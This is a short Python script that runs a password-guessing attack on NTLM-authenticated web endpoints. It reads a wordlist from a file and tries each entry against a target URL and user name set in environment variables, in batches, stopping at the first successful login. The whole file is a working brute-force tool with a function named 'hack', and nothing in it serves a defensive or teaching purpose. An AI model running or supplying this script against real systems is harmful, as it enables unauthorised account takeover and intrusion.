import os
import asyncio
import requests
from requests_ntlm import HttpNtlmAuth
from dotenv import load_dotenv
load_dotenv()

THREADS = 8
with open('psw.txt') as f: psws = [x.rstrip('\n\r') for x in f.readlines()]
async def hack(i, psw):
    success = requests \
        .get(os.getenv('URL'), auth=HttpNtlmAuth(os.getenv('USER_NAME'), psw)) \
        .status_code == 200 
    print(psw + ('\nsuccess' if success else '\nindex ' + str(i) + '\nfail'))
    return success
async def main():
    for i in range(len(psws) // THREADS):
        if any([await x for x in
               [asyncio.create_task(hack(i * THREADS + j, psws[i * THREADS + j])) 
               for j in range(THREADS)]]): break
asyncio.run(main())
